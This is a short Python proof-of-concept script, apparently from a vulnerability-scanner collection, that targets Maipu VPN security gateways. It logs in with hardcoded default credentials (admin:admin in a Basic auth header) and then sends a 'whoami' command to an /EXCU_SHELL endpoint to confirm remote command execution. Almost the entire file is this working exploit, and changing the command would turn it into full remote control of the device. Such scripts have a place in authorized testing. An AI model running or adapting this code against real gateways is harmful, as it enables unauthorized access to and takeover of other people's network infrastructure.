#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 迈普vpn安全网关弱口令&&执行命令
referer: unknown
author: Lucifer
description: 弱口令可获取admin权限,可执行系统命令。
'''
import sys
import requests


class mpsec_weakpass_exec_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "Authorization":"Basic YWRtaW46YWRtaW4=",
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        headers2 = {
            "Authorization":"Basic YWRtaW46YWRtaW4=",
            "command1":"whoami",
            "mode":"EN",
            "cmdnum":"1",
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.status_code == 200:
                pass
            vulnurl = self.url + "/EXCU_SHELL"
            req = requests.get(vulnurl, headers=headers2, timeout=10, verify=False)
            if r"You Are admin" in req.text:
                return "[+]存在迈普vpn安全网关执行命令漏洞...(高危)\tpayload: "+vulnurl
            else:
                return "[-]no vuln"
        except:
            return "[-] ======>连接超时"

if __name__ == "__main__":
    testVuln = mpsec_weakpass_exec_BaseVerify(sys.argv[1])
    testVuln.run()
